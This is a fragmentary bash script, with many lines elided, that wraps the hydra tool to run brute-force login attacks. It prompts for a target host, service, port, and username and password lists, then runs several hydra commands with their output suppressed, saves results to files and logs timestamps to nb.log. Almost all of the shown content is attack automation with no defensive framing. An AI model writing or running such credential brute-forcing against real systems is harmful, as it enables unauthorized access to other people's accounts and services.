#!/bin/bash
#-e allow \n to down one line
# I didn't do scanning for one port because the port can chnage will show to you the protocol is colse but when do scanning on 100,1000,65535ports will show all the common ports and you can see the protocol that is work on another port number 
function fun0() {
...
then
 ...
 read q
  ...
  echo "Enter the file name that contains the passwords list"
  read l
...
echo "Will start brute force attack after to enter the informations"
  ...
  echo "Enter the file that contains the usernames list"
  read c

  echo "Enter the password"
  read d

hydra -L $c -p $d -v $a $b -t4 -o $a.txt &>/dev/null
...
then
 ...
 read g
  ...
  echo "Enter the file name that contains usernames list"
  read j
...
hydra -L $j -P $v -v $g $h -o $g.txt &>/dev/null
  echo "The brute force attack was at $(date)">> nb.log
echo "######THE RESULTS######"
cat $g.txt
  echo "The results of brote force attack was showing at $(date)" >> nb.log
...
then
  ...
  read K
hydra -l $I -P $J  $w $H -v -s$K -o $w.txt &>/dev/null
  echo "The brute force attack was at $(date)">> nb.log
 echo "######THE RESULTS######"
cat $w.txt
  echo "The results of brote force attack was showing at $(date)" >> nb.log
...
then
  ...
  echo "Enter the file name that contains the usernames list"
  read N
...
hydra -L $N -p $AA -v $BB $M -s$Q -o $BB.txt &>/dev/null
...
then
 ...
 read R
  ...
  echo "Enter the file name that contain the usernames list"
  read T

   echo "####IF THE FILE NOT EXISTING IN THE CURRENT PATH,THEN,ENTER THE FULL PATH THAT CONTAIN THE FILE NAME####"

   echo "Enter the file name that contain the password list"
   read U
...
hydra -L $T -P $U  $R $S -v -s$Y -o $R.txt &>/dev/null
